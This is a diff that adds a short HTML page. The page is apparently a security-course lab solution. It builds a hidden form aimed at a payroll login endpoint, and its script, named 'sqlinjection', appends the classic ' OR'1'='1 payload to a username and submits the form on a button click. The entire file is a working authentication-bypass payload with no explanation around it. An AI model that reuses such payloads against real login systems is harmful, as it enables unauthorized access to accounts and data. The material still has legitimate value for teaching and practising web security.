@@ -1,0 +1,24 @@
+<html>
+  <body>
+    <form action="http://payroll.gatech.edu" onsubmit = "" method="POST" id="sql">
+	<input id="alpha" type="hidden" name="RWFzdGVyRWdnRm9yU3VtbWVyMjAxOVQzDQo" value="RWFzdGVyRWdnRm9yU3VtbWVyMjAxOVQzDQo"/>
+	<input id="action" type="hidden" name="action" value="login"/>
+	<input id="login" type="hidden" name="login" value=""/>
+	<input id="pw" type="hidden" name="pw" value=""/>
+	<input id="secret" type="hidden" name="secret" value="whatdoido?"/>
+    </form>
+    <script>
+	function sqlinjection(){
+	   var alph = 'RWFzdGVyRWdnRm9yU3VtbWVyMjAxOVQzDQo';
+	   var name = document.getElementById("targetlogin").value + "' OR'1'='1";
+	   var pw = 'passwd';
+	   document.getElementById("login").value = name;
+	   document.getElementById("pw").value = pw;
+	   document.getElementById("alpha").value = alph;
+	   document.getElementById("sql").submit();
+	}
+   </script>
+   <input name="login" id="targetlogin" value="username"/>
+   <button id="exploit" onclick="sqlinjection();">Hold onto your butts!</button>
+  </body>
+</html>
